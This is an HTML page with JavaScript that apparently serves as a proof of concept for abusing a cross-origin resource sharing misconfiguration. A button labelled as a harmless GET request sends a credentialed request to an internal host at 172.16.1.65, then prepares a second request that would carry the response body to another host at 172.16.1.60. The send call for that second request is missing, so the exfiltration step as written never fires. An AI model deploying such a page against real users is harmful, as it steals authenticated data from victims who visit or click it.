<html>
<head>
<script>
function boom(){
var xmlhttp;
xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET","http://172.16.1.65/",true);
xmlhttp.withCredentials = true;
xmlhttp.send(); 
//var str=xmlhttp.getAllResponseHeaders();
  
xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == XMLHttpRequest.DONE) {
       // alert(xmlhttp.responseText);
      var xhr2=new XMLHttpRequest();
      xhr2.open("GET","http://172.16.1.60/"+encodeURI(xmlhttp.responseText),true);
      
    }
}
}
</script>
</head>
<body>

<button onclick=boom()>Send an HTTP GET request to a page and get the result back</button>

</body>
</html>
